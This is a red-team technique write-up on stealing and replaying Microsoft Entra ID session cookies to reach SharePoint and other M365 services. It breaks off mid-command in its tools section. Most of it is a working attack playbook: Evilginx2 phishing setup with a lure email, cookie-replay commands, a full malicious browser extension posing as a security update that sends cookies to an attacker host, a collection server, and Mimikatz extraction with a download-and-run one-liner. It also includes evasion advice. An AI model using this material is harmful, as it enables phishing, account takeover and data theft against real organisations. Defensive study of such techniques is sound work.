# [CA-COOKIE-001]: SharePoint Online Cookie Theft

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | CA-COOKIE-001 |
| **MITRE ATT&CK v18.1** | [T1539: Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/) |
| **Tactic** | Credential Access |
| **Platforms** | M365 (Microsoft 365) – SharePoint Online, Outlook Online, Teams, all SaaS services using Entra ID |
| **Severity** | Critical |
| **CVE** | N/A (session-level exploitation, not software vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | All tenants with Entra ID authentication (no version restrictions) |
| **Patched In** | Ongoing mitigation via Conditional Access Token Protection, Linkable Token Identifiers (SessionId), device-bound cookie policies |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) not included because no dedicated Atomic test exists for cookie theft (application-level). All sections apply universally across M365 environments.

---

## 2. Executive Summary

**Concept:** SharePoint Online authentication relies on HTTP session cookies issued by Microsoft Entra ID following successful user authentication. The primary authentication cookies are **ESTSAUTH** (transient, session-bound) and **ESTSAUTHPERSISTENT** (persistent, with "Stay Signed In" option). These cookies serve as proof-of-authentication and bypass username/password requirements on subsequent requests. Unlike tokens that are bound to devices or IP addresses, session cookies in M365 were historically only bound to the user and browser. An attacker who obtains these cookies can replay them to gain access to SharePoint sites, Outlook mailboxes, Teams channels, and other cloud services—**without requiring the user's password or triggering MFA** because the MFA requirement was satisfied during the initial authentication that generated the cookies.

**Attack Surface:** The attack surface includes browser memory, network traffic during login, Chrome/Edge encrypted cookie storage (accessible via DPAMI decryption), and MITM interception points during phishing campaigns. Stolen cookies can be extracted from victim machines via malware, browser extensions, or MITM proxies.

**Business Impact:** **Unrestricted access to all M365 services associated with the victim user.** An attacker with stolen ESTSAUTHPERSISTENT cookies can access SharePoint documents indefinitely, read and forward email, impersonate the user in Teams, steal contacts, create inbox rules for data exfiltration, and pivot to additional cloud resources. The attack often precedes BEC (Business Email Compromise), ransomware deployment via SharePoint, and supply-chain attacks via document manipulation.

**Technical Context:** Cookie theft is typically the second stage of a phishing attack. The first stage (credential + MFA bypass) occurs via Adversary-in-the-Middle (AITM) tools like Evilginx2, which proxies the victim's login and captures the session cookies immediately after MFA. Alternatively, malware or browser extensions running on the victim's machine continuously harvest cookies as they are refreshed. Once stolen, a persistent cookie is valid for weeks to months, providing long-term persistence.

### Operational Risk

- **Execution Risk:** Low. Requires either social engineering (phishing to AITM site) or local code execution (malware/extension). AITM phishing is highly effective (40-50% compromise rate in targeted campaigns).
- **Stealth:** High when using AITM proxies (looks like legitimate login). Medium when using browser extensions (visible in browser extensions list if user inspects). Low if using malware (may be flagged by AV).
- **Reversibility:** No. A stolen ESTSAUTHPERSISTENT cookie remains valid until manually revoked or expires. User password reset does not invalidate cookies. Only device revocation or explicit session termination via Azure Portal removes access.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1 (Session Timeout), 6.2 (Endpoint Security) | Absence of session binding to device/IP and weak endpoint controls allow cookie theft and replay without detection. |
| **DISA STIG** | AC-2(a) Account Management | Inadequate session management; cookies not tied to hardware or device identity. |
| **CISA SCuBA** | MS.AAE.02 | Require device-bound tokens; reject unbound cookies from unregistered devices. |
| **NIST 800-53** | AC-3 (Access Enforcement), AC-12 (Session Termination) | Cookies represent bearer tokens without binding; failure to enforce device-level access controls. |
| **GDPR** | Art. 32 (Security of Processing) | Failure to implement technical measures (device binding, encryption, session protection) for sensitive cloud data. |
| **DORA** | Art. 9 (Protection and Prevention) | Financial institution access must be bound to authenticated device/user; unbound cookies violate principle. |
| **NIS2** | Art. 21 (Cyber Risk Management) | Critical infrastructure must implement multi-factor authentication + device binding; cookies alone insufficient. |
| **ISO 27001** | A.9.2.5 (Access Rights Review), A.10.1.1 (Cryptographic Controls) | Token lifecycle not managed; no binding mechanism for session persistence. |
| **ISO 27005** | Risk: Unauthorized Access via Session Hijacking | Compromise of authentication session represents residual risk to confidentiality/integrity. |

---

## 3. Technical Prerequisites

**Required Privileges:**
- **For AITM phishing:** No local admin required; victim must click phishing link and authenticate.
- **For malware-based extraction:** User-level code execution (e.g., script, browser extension) is sufficient.
- **For Mimikatz DPAPI decryption:** Local Administrator access to the victim machine.
- **For browser extension theft:** No elevation; runs in user context with browser permissions.

**Required Access:**
- Network access to Microsoft Entra ID login endpoints (login.microsoftonline.com, *.microsoft.com).
- For AITM: Ability to host phishing domain (requires DNS + HTTPS certificate).
- For browser extension: Ability to distribute extension (sideload, malicious store, social engineering).

**Supported Versions:**
- **Entra ID:** All tenant configurations (no version restrictions; applies to all cloud identity setups).
- **SharePoint Online:** All modern versions (SPO, M365 Groups, Teams sites).
- **Browsers:** Chrome, Edge, Firefox, Safari (any browser storing Entra ID cookies).
- **Operating Systems:** Windows, macOS, Linux, iOS, Android.

**Tools:**
- [Evilginx2](https://github.com/kgretzky/evilginx2) – AITM proxy; intercepts logins and captures cookies.
- [Muraena](https://github.com/muraenateam/muraena) – Lightweight AITM toolkit.
- [TokenSmith](https://github.com/Flangvik/TokenSmith) – OAuth token extraction from authenticated browser sessions.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) – DPAPI module for decrypting Chrome cookies.
- [Browser DevTools](https://developer.chrome.com/docs/devtools/) – Manual cookie inspection and export.

---

## 4. Environmental Reconnaissance

### Step 1: Identify SharePoint and M365 Services in Scope

**Objective:** Determine which SharePoint sites and M365 services are accessible by the target user.

**Command (PowerShell - List Connected Services):**
```powershell
# Connect as target user (if already authenticated)
Get-MgUserApp | Select-Object DisplayName, AppName | Where-Object { $_.AppName -like "*Share*" -or $_.AppName -like "*Outlook*" -or $_.AppName -like "*Teams*" }

# Or query via browser while logged in
# Visit: https://myapps.microsoft.com
# Or: https://outlook.office.com (Outlook)
# Or: https://teams.microsoft.com (Teams)
# Or: https://<tenant>.sharepoint.com (SharePoint)
```

**What to Look For:**
- Active licenses for SharePoint, Exchange, Teams indicate accessible services.
- Presence of ESTSAUTH/ESTSAUTHPERSISTENT cookies in browser (check DevTools → Application → Cookies).

**OpSec & Evasion:** This reconnaissance generates no logs if performed via browser; only user-visible activity.

---

### Step 2: Check Browser Cookie Storage and Entra ID Session Status

**Objective:** Verify Entra ID session exists and cookies are present.

**Command (Browser DevTools - Chrome/Edge):**
1. Open browser where user is logged into Microsoft 365.
2. Press **F12** or right-click → **Inspect** to open DevTools.
3. Navigate to **Application** → **Cookies** → select `https://login.microsoftonline.com`.
4. Look for cookies:
   - **ESTSAUTH**: Session cookie (typically ~1-8 hours TTL)
   - **ESTSAUTHPERSISTENT**: Persistent cookie (if "Stay Signed In" was checked; weeks to months TTL)
   - **ESTSAUTHLIGHT**: Lightweight session token (optional, depends on scenario)

**Expected Output:**
```
Name: ESTSAUTH
Value: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJ...
Domain: .login.microsoftonline.com
Path: /
Expires/Max-Age: Session (or specific date if ESTSAUTHPERSISTENT)
Secure: ✓ (HTTPS only)
HttpOnly: ✓ (Not accessible via JavaScript; protects against XSS)
SameSite: Lax or Strict
```

**What This Means:**
- **HttpOnly Flag:** Prevents JavaScript from reading cookie; must be extracted via network interception or memory/file access.
- **Secure Flag:** Transmitted only over HTTPS; protects against network eavesdropping on unencrypted channels.
- **SameSite:** Restricts cookie transmission in cross-site requests (can be bypassed by MITM proxy that rewrites request origins).

**OpSec & Evasion:** DevTools inspection generates no remote logs; visible only to user if they inspect their own browser.

---

## 5. Detailed Execution Methods

### METHOD 1: Adversary-in-the-Middle (AITM) Phishing via Evilginx2

**Supported Versions:** All Entra ID tenants, all browsers.

#### Step 1: Set Up Evilginx2 AITM Proxy

**Objective:** Create a reverse proxy that intercepts and logs user credentials and cookies during the login process.

**Prerequisites:**
- Linux/macOS server with public IP or domain.
- Valid HTTPS certificate (Let's Encrypt recommended).
- Ability to resolve phishing domain via DNS (DNS hijack or registered domain under attacker control).

**Command (Install Evilginx2):**
```bash
# Download and install Evilginx2
wget https://github.com/kgretzky/evilginx2/releases/download/v2.4.0/evilginx2-v2.4.0-linux-amd64.zip
unzip evilginx2-v2.4.0-linux-amd64.zip
chmod +x evilginx2

# Run Evilginx2 in interactive mode
./evilginx2 -p 8443
```

**Expected Output:**
```
[*] Evilginx v2.4.0 loaded
[*] Type 'help' for commands
[*] Listening on 0.0.0.0:8443 (TLS)
evilginx> 
```

**What This Means:**
- Evilginx2 is now listening for incoming connections on port 8443 (HTTPS).
- The tool will act as a transparent proxy, forwarding legitimate login requests to Microsoft while logging captured data.

**OpSec & Evasion:**
- **Detection Likelihood: High.** Certificate authority logs, domain registration whois data, and SSL certificate transparency logs expose the phishing infrastructure.
- **Mitigation:** Use fast-flux DNS, short-lived certificates, and compromised infrastructure (VPS) for rapid decommissioning post-campaign.

---

#### Step 2: Configure Evilginx2 Phishing Site (SharePoint/Outlook)

**Objective:** Create a phishing site that mimics Microsoft login, capturing credentials and cookies.

**Command (Evilginx2 Interactive Configuration):**
```bash
evilginx> config domain phishing.attacker-domain.com          # Attacker-controlled domain
evilginx> config ip <ATTACKER_SERVER_IP>                      # Attacker's server IP
evilginx> phish                                                # List available phishing templates

# Output shows: office365, outlook, sharepoint, teams, etc.

evilginx> phish office365
evilginx> phish outlook                                        # Select Outlook phishing template
evilginx> create                                               # Create phishing site instance
```

**Alternative (Manual Evilginx Config File):**
```yaml
# ~/.evilginx2/phishlets/office365.yaml
name: "Office 365"
author: "attacker"
min_ver: "2.4.0"

proxy_hosts:
  - { phish_subdomain: "login", real_host: "login.microsoftonline.com", is_landing: true }
  - { phish_subdomain: "graph", real_host: "graph.microsoft.com" }

auth_tokens:
  - { domain: ".microsoftonline.com", keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT"] }

credentials:
  username:
    param: "login_str"
    search: true
  password:
    param: "passwd"
    search: true
```

**Expected Output:**
```
[+] Phishing site created: login-phishing.attacker-domain.com
[+] Listening on https://login-phishing.attacker-domain.com
[+] Ready to intercept logins
```

**What This Means:**
- Evilginx2 now proxies all traffic between the victim and `login.microsoftonline.com`.
- Credentials and cookies intercepted during login are logged to Evilginx2's database.

**Version Note:** Evilginx2 v2.3+ includes auto-filling of Microsoft MFA screens; v2.4+ supports token generation and Evilginx2 Telegram notifications.

**OpSec & Evasion:**
- **Detection Likelihood: Medium.** MITM proxy can be detected via certificate pinning or strict TLS validation.
- **Mitigation:** Modern browsers warn about untrusted certificates; user must explicitly accept the risk (increases likelihood of detection by SOC if certificate warnings are monitored).
- **Advanced evasion:** Use legitimate certificate issued to attacker-controlled domain (phishing.attacker-domain.com mimics legitimate login.microsoftonline.com).

---

#### Step 3: Social Engineering Campaign - Phishing Link Distribution

**Objective:** Trick victim into visiting the Evilginx2 phishing site and authenticating.

**Command (Generate Phishing Link):**
```bash
evilginx> lures create office365                              # Create new lure (phishing campaign)
evilginx> lures get-url 1                                     # Get phishing URL for lure #1

# Output:
# https://login-phishing.attacker-domain.com/redir?rid=1a2b3c4d

evilginx> logs list                                            # View captured credentials/cookies
```

**Phishing Email Example:**
```
From: microsoft-security@defender-outlook.com (spoofed)
Subject: URGENT: Your Office 365 account requires verification

Hi [User],

Your Office 365 account has been flagged for suspicious activity. 
Please verify your identity immediately by clicking the link below:

[Click Here to Verify Account](https://login-phishing.attacker-domain.com/redir?rid=1a2b3c4d)

This link expires in 24 hours. Failure to verify may result in account suspension.

---
Microsoft Security Team
```

**Expected Victim Flow:**
1. User clicks phishing link.
2. Browser navigates to `login-phishing.attacker-domain.com` (MITM Evilginx2 proxy).
3. User sees replica of Microsoft login page (visually identical to legitimate login.microsoftonline.com).
4. User enters username + password.
5. Evilginx2 forwards credentials to real login.microsoftonline.com and logs them.
6. Real Microsoft login returns MFA challenge (e.g., "Enter code from your authenticator app").
7. Evilginx2 proxies MFA challenge back to user's browser.
8. User completes MFA (enters code, approves push notification).
9. Microsoft issues ESTSAUTH and ESTSAUTHPERSISTENT cookies.
10. Evilginx2 intercepts cookies, logs them, and forwards to user's browser.
11. User is redirected to legitimate Outlook/SharePoint (user believes attack succeeded; unaware they're compromised).
12. Attacker now has captured credentials + cookies + MFA proof.

**OpSec & Evasion:**
- **Detection Likelihood: Medium-High.** Email security gateways may flag phishing links; domain reputation services (URLhaus, VirusTotal) may block access.
- **Mitigation:** Use freshly registered domains, slow email distribution (avoid mass campaigns), target specific high-value users.

**Troubleshooting:**
- **Error:** "Certificate validation failed": Victim's browser rejects untrusted certificate. Attacker must provide legitimate certificate (e.g., purchased or compromised) or accept credential-only capture (without cookies).
- **Error:** "Evilginx2 not forwarding MFA correctly": Update to latest version; some MFA types (Windows Hello, FIDO2) may not be proxiable.

**References:**
- [Evilginx2 GitHub](https://github.com/kgretzky/evilginx2)
- [From Cookie Theft to BEC - Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/)
- [Evilginx Phishing PoC - SpecterOps](https://specterops.io/)

---

#### Step 4: Extract Captured Credentials and Cookies from Evilginx2 Database

**Objective:** Retrieve stolen cookies and credentials from Evilginx2 logs for later replay.

**Command (Export Captured Data):**
```bash
evilginx> logs list                                            # List all captured sessions
evilginx> logs delete 1                                        # Delete log entry (cleanup)

# Alternatively, access Evilginx2 database directly:
sqlite3 ~/.evilginx2/evilginx.db "SELECT * FROM sessions;" | grep -E "ESTSAUTH|credentials"

# Export to JSON:
sqlite3 ~/.evilginx2/evilginx.db ".mode json" "SELECT * FROM sessions;" > captured_sessions.json
```

**Expected Output:**
```json
{
  "sessions": [
    {
      "id": 1,
      "timestamp": "2025-01-08 10:30:00",
      "username": "user@company.com",
      "password": "P@ssw0rd123!",
      "cookies": {
        "ESTSAUTH": "eyJhbGciOiJSUzI1NiI...",
        "ESTSAUTHPERSISTENT": "eyJhbGciOiJSUzI1NiI...",
        "ESTSAUTHLIGHT": "eyJhbGciOiJSUzI1NiI..."
      },
      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
      "ip_address": "203.0.113.45"
    }
  ]
}
```

**What This Means:**
- **ESTSAUTH**: Short-lived session token (~1-8 hours); useful for immediate access.
- **ESTSAUTHPERSISTENT**: Long-lived token (weeks-months); provides persistent access even after victim logs out.
- **User Agent**: Captured from victim's browser; must be replicated to avoid detection.
- **IP Address**: Victim's original IP; attacker's replay may come from different IP (anomaly signal).

**OpSec & Evasion:**
- **Detection Likelihood: Low** if extracted from Evilginx2 database (no logs generated).
- **Mitigation:** Capture ESTSAUTHPERSISTENT (longer validity); avoid unnecessary credential exfiltration (use cookies instead).

**Troubleshooting:**
- **Error:** "evilginx.db not found": Evilginx2 database path varies; check `~/.evilginx2/` or `/opt/evilginx2/`.
- **Error:** "sqlite3 command not found": Install SQLite3: `apt-get install sqlite3` (Linux).

---

#### Step 5: Replay Stolen Cookies to Access SharePoint

**Objective:** Use the captured ESTSAUTHPERSISTENT cookie to authenticate to SharePoint Online as the victim user.

**Command (cURL - Cookie Replay):**
```bash
# Set environment variables with captured cookies
export ESTSAUTH="eyJhbGciOiJSUzI1NiI..."
export ESTSAUTH_PERSISTENT="eyJhbGciOiJSUzI1NiI..."
export USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36..."

# Request SharePoint site (cookies act as proof-of-authentication)
curl -i \
  -H "Cookie: ESTSAUTH=$ESTSAUTH; ESTSAUTHPERSISTENT=$ESTSAUTH_PERSISTENT" \
  -H "User-Agent: $USER_AGENT" \
  "https://company.sharepoint.com/sites/Finance"
```

**Expected Response (Success):**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: rtFa=...; secure; httponly; samesite=lax
...
<html>
<head><title>Finance Site - SharePoint</title></head>
<body>
  <!-- SharePoint site content -->
  <div id="contentBox">
    <h1>Finance Documents</h1>
    <ul>
      <li>Budget_2025.xlsx</li>
      <li>Payroll_Data.csv</li>
    </ul>
  </div>
</body>
</html>
```

**What This Means:**
- **HTTP 200 OK**: Cookies accepted; authentication successful.
- **Set-Cookie rtFa**: SharePoint issued a new session-specific cookie; cookies are valid.
- **SharePoint content rendered**: Attacker now has full access to SharePoint site and all documents visible to the victim user.

**Command (PowerShell - Download SharePoint Documents via Stolen Cookie):**
```powershell
# Create credential object using stolen cookie
$cookieContainer = New-Object System.Net.CookieContainer
$cookie1 = New-Object System.Net.Cookie
$cookie1.Name = "ESTSAUTHPERSISTENT"
$cookie1.Value = "eyJhbGciOiJSUzI1NiI..."
$cookie1.Domain = ".sharepoint.com"

$cookieContainer.Add($cookie1)

# Make authenticated request to SharePoint
$request = [System.Net.HttpWebRequest]::Create("https://company.sharepoint.com/sites/Finance/_api/web/lists/GetByTitle('Documents')/items")
$request.CookieContainer = $cookieContainer
$request.Headers.Add("User-Agent", "Mozilla/5.0...")

$response = $request.GetResponse()
$streamReader = New-Object System.IO.StreamReader($response.GetResponseStream())
$content = $streamReader.ReadToEnd()

Write-Host "Response: $content" | ConvertFrom-Json | Select-Object -Property Title, Id
```

**Expected Output:**
```
Title                           Id
-----                           --
Budget_2025.xlsx                1
Payroll_Data.csv                2
Strategic_Plan_2025.docx        3
```

**OpSec & Evasion:**
- **Detection Likelihood: Medium-High.** Multiple document downloads from non-matching IP/user agent may trigger anomaly detection.
- **Mitigation:** Space downloads over time; use victim's original user agent; access from similar geographic location (if possible via proxy).

**Troubleshooting:**
- **Error 401 Unauthorized**: Cookie has expired. Regenerate via Evilginx2.
- **Error 403 Forbidden**: User lacks permission to access resource or Conditional Access policy blocked access (device not compliant, location blocked).
- **Fix**: Use ESTSAUTHPERSISTENT (longer validity); ensure user agent matches original victim's browser.

**References:**
- [OAuth Token Extraction from Authenticated Sessions - TokenSmith](https://github.com/Flangvik/TokenSmith)
- [Evilginx2 Cookie Capture PoC - Sophos Labs](https://www.sophos.com/en-us/blog/stealing-user-credentials-with-evilginx)

---

### METHOD 2: Malicious Browser Extension - Continuous Cookie Harvesting

**Supported Versions:** Chrome, Edge, Firefox (all platforms).

#### Step 1: Create Malicious Chrome Extension Manifest

**Objective:** Create a Chrome extension that monitors Microsoft login pages and exfiltrates cookies when they are set.

**File: manifest.json**
```json
{
  "manifest_version": 3,
  "name": "Office 365 Security Update",
  "version": "1.0",
  "description": "Enhances Office 365 security",
  "permissions": [
    "cookies",
    "webRequest",
    "tabs",
    "storage"
  ],
  "host_permissions": [
    "https://login.microsoftonline.com/*",
    "https://outlook.office.com/*",
    "https://*.sharepoint.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["https://login.microsoftonline.com/*"],
      "js": ["content.js"]
    }
  ]
}
```

**File: content.js (Runs in page context)**
```javascript
// Monitor for Entra ID login completion event
document.addEventListener('DOMContentLoaded', function() {
  // Hook into MSAL (Microsoft Authentication Library) authentication event
  if (window.MSAL && window.MSAL.msalInstance) {
    window.MSAL.msalInstance.addEventCallback(function(message) {
      if (message.eventType === 'msal:loginSuccess') {
        console.log('[*] Microsoft login detected');
        
        // Extract cookies after successful login
        fetch('chrome-extension://' + chrome.runtime.id + '/get_cookies', {
          method: 'POST'
        });
      }
    });
  }
  
  // Alternative: Monitor for cookie changes
  setInterval(function() {
    document.cookie.split(';').forEach(function(cookie) {
      let cookieName = cookie.trim().split('=')[0];
      if (cookieName.includes('ESTAUTH')) {
        console.log('[+] Found auth cookie: ' + cookieName);
        chrome.runtime.sendMessage({type: 'COOKIE_FOUND', cookie: cookie});
      }
    });
  }, 5000);
});
```

**File: background.js (Service Worker)**
```javascript
// Listen for cookies found in content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'COOKIE_FOUND') {
    console.log('[+] Exfiltrating: ' + message.cookie);
    
    // Send to attacker server
    fetch('https://attacker-collector.com/api/cookies', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        user: message.cookie,
        timestamp: new Date(),
        url: sender.url
      })
    });
  }
});

// Alternative: Use Chrome cookies API to access all cookies
chrome.cookies.onChanged.addListener((changeInfo) => {
  if (changeInfo.cookie.name.includes('ESTAUTH') || changeInfo.cookie.name.includes('rtFa')) {
    console.log('[+] Cookie change detected: ' + changeInfo.cookie.name);
    
    // Log cookie value
    fetch('https://attacker-collector.com/api/cookies', {
      method: 'POST',
      body: JSON.stringify({
        name: changeInfo.cookie.name,
        value: changeInfo.cookie.value,
        domain: changeInfo.cookie.domain,
        expirationDate: changeInfo.cookie.expirationDate
      })
    });
  }
});
```

**Expected Behavior:**
- Extension monitors `login.microsoftonline.com` for authentication events.
- When user logs in and ESTSAUTH/ESTSAUTHPERSISTENT cookies are set, extension captures them.
- Captured cookies are exfiltrated to attacker's collection server (https://attacker-collector.com/api/cookies).
- Extension persists across browser restarts, continuously harvesting cookies on each login.

**OpSec & Evasion:**
- **Detection Likelihood: High.** Extension visible in browser's extension list (chrome://extensions); suspicious permissions may raise user awareness.
- **Mitigation:** Use believable extension name (e.g., "Office 365 Security Update"); permission request appears generic; obfuscate code.

---

#### Step 2: Deploy Extension via Social Engineering or Malware

**Objective:** Get victim to install the malicious extension.

**Method A: Fake Browser Store Listing**
```
1. Create fake Chrome Web Store entry (clone of legitimate Microsoft extension).
2. Register domain: `chrome-microsoft-ext.com` or similar.
3. Create installation page that appears to be Chrome Web Store.
4. Send phishing email with link to fake installation page.
5. Victim clicks "Add to Chrome" → extension installs with malicious payload.
```

**Method B: Sideload Extension via Group Policy (Enterprise Only)**
```
# Group Policy to force install malicious extension
[HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome\ExtensionInstallForcelist]
"1"="malicious_extension_id;https://attacker.com/extension.crx"
```

**Method C: Package Extension with Legitimate Software**
```
Distribute extension as part of software installer (e.g., VPN, antivirus software).
Checkbox: "Install Office 365 Security Extension" (enabled by default).
```

**Expected User Experience:**
- User installs extension (unknowingly).
- Extension silently runs in background, monitoring logins.
- Each time user logs into Microsoft 365, cookies are harvested and sent to attacker.
- User has no indication of compromise (no alerts, no UI changes).

**OpSec & Evasion:**
- **Detection Likelihood: Medium.** Users may notice extension in browser extensions list; Chrome may warn of unusual extension permissions.
- **Mitigation:** Request minimal permissions; hide extension in background; use legitimate-sounding names.

**Troubleshooting:**
- **Error:** "Extension installation blocked by policy": Enterprise may have extension policy restrictions. Use alternative method (malware-based extraction).
- **Error:** "Cookies API not accessible": Manifest v3 restricts cookie access. Use v2 (deprecated) or rely on content script interception.

**References:**
- [Chrome Extension Manifest v3 - Google Developers](https://developer.chrome.com/docs/extensions/mv3/)
- [Cookie-Bite PoC - Varonis Labs](https://www.varonis.com/blog/cookie-bite)

---

#### Step 3: Monitor and Collect Exfiltrated Cookies

**Objective:** Set up a collection server to receive exfiltrated cookies from victim extensions.

**Command (Python Flask Server - Attacker's Collection Point):**
```python
from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

# Store collected cookies
collected_cookies = []

@app.route('/api/cookies', methods=['POST'])
def collect_cookies():
    data = request.json
    
    # Add timestamp and source info
    data['timestamp'] = datetime.now().isoformat()
    data['source_ip'] = request.remote_addr
    data['user_agent'] = request.headers.get('User-Agent', 'Unknown')
    
    # Log to file
    with open('stolen_cookies.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    # Store in memory for quick access
    collected_cookies.append(data)
    
    print(f"[+] Cookie collected from {request.remote_addr}")
    print(f"    Cookie: {data.get('value', 'N/A')[:50]}...")
    
    return jsonify({'status': 'success'}), 200

@app.route('/api/list_cookies', methods=['GET'])
def list_cookies():
    # Return all collected cookies (password-protected in real scenario)
    return jsonify(collected_cookies), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')  # Requires pyopenssl
```

**Expected Output (Attacker's Perspective):**
```
 * Serving Flask app 'cookie_collector'
 * Debug mode: off
 * Running on https://0.0.0.0:443
 * Press CTRL+C to quit

[+] Cookie collected from 203.0.113.45
    Cookie: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ...
[+] Cookie collected from 203.0.113.45
    Cookie: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ...
```

**Viewing Collected Cookies:**
```bash
# Query collection server
curl "https://attacker-collector.com/api/list_cookies" | jq '.[] | {user, timestamp, domain}'

# Output:
# {
#   "user": "user@company.com",
#   "timestamp": "2025-01-08T10:30:00.123456",
#   "domain": ".sharepoint.com"
# }
```

**OpSec & Evasion:**
- **Detection Likelihood: High.** Collection server IP may be exposed via DNS logs or network monitoring.
- **Mitigation:** Use bulletproof hosting; rotate IP addresses; implement rate limiting to avoid triggering alerts.

---

### METHOD 3: DPAPI-Decrypted Chrome Cookie Extraction (Local Access)

**Supported Versions:** Windows 10+, Windows 11 (when Mimikatz has local admin access).

#### Step 1: Identify Chrome Cookie Database Location

**Objective:** Locate Chrome's encrypted cookie storage file on victim machine.

**Command (PowerShell - Find Chrome Cookie DB):**
```powershell
# Chrome stores cookies in SQLite database
$chromeDbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

if (Test-Path $chromeDbPath) {
    Write-Host "[+] Found Chrome cookie database: $chromeDbPath"
    Get-Item $chromeDbPath | Select-Object FullName, LastWriteTime, Length
} else {
    Write-Host "[-] Chrome cookie database not found"
}

# Check if Chrome process is running (cookies may be locked if Chrome is open)
Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object ProcessName, Id
```

**Expected Output:**
```
[+] Found Chrome cookie database: C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Cookies
    FullName: C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Cookies
    LastWriteTime: 2025-01-08 10:30:00
    Length: 1048576 (1 MB)

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
   2000    150  523456     854321      2.50   5678   2 chrome
```

**What This Means:**
- Chrome process is running, so the Cookies database is locked (cannot be copied directly).
- Cookie database is located at the typical Chrome path.
- File size (1 MB) indicates normal activity with many cookies stored.

**OpSec & Evasion:**
- **Detection Likelihood: Low.** Locating the file is not suspicious; accessing it requires admin privileges (flagged by UAC/EDR).

---

#### Step 2: Dump DPAPI Master Key and Chrome Cookies via Mimikatz

**Objective:** Extract and decrypt Chrome's encrypted cookie database using DPAPI keys.

**Command (Mimikatz - DPAPI Cookie Extraction):**
```cmd
mimikatz.exe
mimikatz # privilege::debug                         # Elevate to DEBUG privilege

mimikatz # dpapi::chrome /in:C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Cookies /unprotect

# Output will show decrypted cookies:
# [COOKIE] ESTSAUTH = eyJhbGciOiJSUzI1NiI...
# [COOKIE] ESTSAUTHPERSISTENT = eyJhbGciOiJSUzI1NiI...
# [COOKIE] rtFa = ...
```

**Alternative (One-Liner):**
```powershell
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "privilege::debug" "dpapi::chrome /in:$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies /unprotect" "exit" | Out-File cookies.txt
```

**Expected Output:**
```
mimikatz # dpapi::chrome /in:C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Cookies /unprotect

Chrome cookie decryption for: C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Cookies

  host_key : google.com
    name_key : CONSENT
    value (hex): 36313031353635323331
    value (utf8): 610156523
    encrypted: no

  host_key : .login.microsoftonline.com
    name_key : ESTSAUTH
    value (encrypted hex): ... [ENCRYPTED DATA] ...
    value (decrypted utf8): eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJpc3MiOiJodHRwczov...
    
  host_key : .login.microsoftonline.com
    name_key : ESTSAUTHPERSISTENT
    value (encrypted hex): ... [ENCRYPTED DATA] ...
    value (decrypted utf8): eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJpc3MiOiJodHRwczov...
```

**What This Means:**
- Mimikatz leveraged DPAPI (Data Protection API) master key to decrypt Chrome's SQLite database encryption.
- ESTSAUTH and ESTSAUTHPERSISTENT cookies are now in plaintext.
- These cookies can be immediately replayed to authenticate to SharePoint, Outlook, Teams.

**Version Note:**
- **Windows 10 (pre-1909):** DPAPI encryption readily decryptable via Mimikatz.
- **Windows 10 (1909+) / Windows 11:** Credential Guard may protect DPAPI master keys; Mimikatz may fail.
- **Fix:** If Credential Guard enabled, use alternative method (AITM phishing or browser extension).

**OpSec & Evasion:**
- **Detection Likelihood: Very High.** Mimikatz binary detected by AV; DPAPI module access logged by EDR.
- **Mitigation:** Use in-memory variants (Invoke-Mimikatz via PowerShell); disable Windows Defender temporarily (detectable); use kernel exploit to bypass protection.

**Troubleshooting:**
- **Error:** "Access Denied" when accessing Chrome database: Chrome is running; kill process first: `taskkill /IM chrome.exe /F`
- **Error:** "DPAPI master key not accessible": Running as non-admin or Credential Guard enabled. Escalate privileges or disable Credential Guard.
- **Fix:** Run as SYSTEM context via PsExec: `psexec -s -i cmd.exe` then run Mimikatz.

**References:**
- [Mimikatz DPAPI Module - GitHub](https://github.com/gentilkiwi/mimikatz/wiki/module-~-dpapi)
- [Chrome Cookie Encryption - Security Research](https://www.chromium.org/developers/design-documents/encrypted-cookies/)

---

## 6. Tools & Commands Reference

### Evilginx2

**Version:** 2.4.0+
**Minimum Version:** 2.3.0 (MFA proxy support)
**Supported Platforms:** Linux, macOS (attacker's server)

**Installation:**
```bash
wget https://github.com/kgretzky/evilginx2/releases/download/v2.4.0/evilginx2-v2.4.0-linux-amd64.zip
